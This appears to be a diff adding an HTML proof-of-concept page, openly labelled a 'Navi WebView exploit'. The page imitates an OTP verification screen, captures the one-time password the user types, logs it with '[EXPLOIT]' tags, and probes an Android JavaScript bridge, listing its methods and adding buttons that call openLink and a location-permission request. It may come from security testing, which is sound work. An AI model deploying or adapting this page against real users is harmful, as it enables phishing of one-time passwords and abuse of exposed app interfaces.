@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h2>Navi OTP Verification</h2>
+    <p>Enter OTP sent to your phone:</p>
+    
+    <input type="text" id="otpInput" placeholder="6 digit OTP" maxlength="6">
+    <button onclick="captureOTP()">Verify</button>
+    
+    <div id="result" style="margin-top:20px; padding:10px; background:#f0f0f0; display:none;"></div>
+    
+    <script>
+        function captureOTP() {
+            const otp = document.getElementById('otpInput').value;
+            
+            if (otp.length !== 6) {
+                alert('Enter 6 digit OTP');
+                return;
+            }
+            
+            // Show captured OTP on page
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = `
+                <h3 style="color:red;">OTP CAPTURED: ${otp}</h3>
+                <p>This OTP was captured via Navi WebView exploit</p>
+            `;
+            resultDiv.style.display = 'block';
+            
+            console.log(`[EXPLOIT] OTP captured: ${otp}`);
+            
+            // Check JS bridge
+            if (typeof Android !== 'undefined') {
+                console.log('[EXPLOIT] JS Bridge available:', Object.keys(Android));
+                
+                // Add test buttons
+                resultDiv.innerHTML += `
+                    <h4>JavaScript Bridge Test:</h4>
+                    <button onclick="Android.openLink('https://google.com')" style="background:red;color:white;padding:10px;margin:5px;">
+                        Test: Open Google
+                    </button>
+                    ${Android.getLocationPermissions ? `
+                    <button onclick="Android.getLocationPermissions()" style="background:orange;color:white;padding:10px;margin:5px;">
+                        Test: Request Location
+                    </button>` : ''}
+                `;
+            } else {
+                console.log('[EXPLOIT] JS Bridge not available');
+            }
+        }
+    </script>
+</body>
+</html>
